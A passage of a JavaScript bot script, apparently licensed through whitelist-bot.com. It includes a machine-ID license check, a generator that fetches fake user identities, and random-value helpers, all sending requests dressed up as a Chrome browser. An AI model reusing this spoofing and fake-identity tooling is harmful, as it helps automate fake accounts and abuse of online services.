            'Referer': 'https://whitelist-bot.com/rahasiaku/',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Te': 'trailers'
        },
        body: new URLSearchParams({
            'MachineId10': machine
        })
    })
}

function licenseCheck(license) {
    var license = fetch(`https://whitelist-bot.com/api.php?license=${license}`, {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "sec-ch-ua": "\".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "none",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "cookie": "_ga=GA1.2.1441011143.1656930356"
            },
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": null,
            "method": "GET"
        })

        .then(async res => {
            const data = await res.json()
            return data
        })
    return license
}

function fakeGenerator() {
    var license = fetch(`https://random-data-api.com/api/users/random_user`, {
            "headers": {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9",
                "sec-ch-ua": "\".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "none",
                "sec-fetch-user": "?1",
                "upgrade-insecure-requests": "1",
                "cookie": "_ga=GA1.2.1441011143.1656930356"
            },
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": null,
            "method": "GET"
        })

        .then(async res => {
            const data = await res.json()
            return data
        })
    return license
}

function rand(length) {
    var result = "";
    var characters = "abcdefghijklmnopqrstuvwxyz0123456789";
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function getRandomNumber() {
    const maxNumber = 250;
    const multiple = 25;

    // Menghasilkan angka acak antara 0 dan maxNumber/multiple (inklusif)
    const randomValue = Math.floor(Math.random() * (maxNumber / multiple + 1));

    // Mengalikan angka acak dengan multiple untuk mendapatkan kelipatan 25
    const randomNumber = randomValue * multiple;

    return randomNumber;
}

function randAngka(length) {
    var result = "";
    var characters = "0123456789";
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}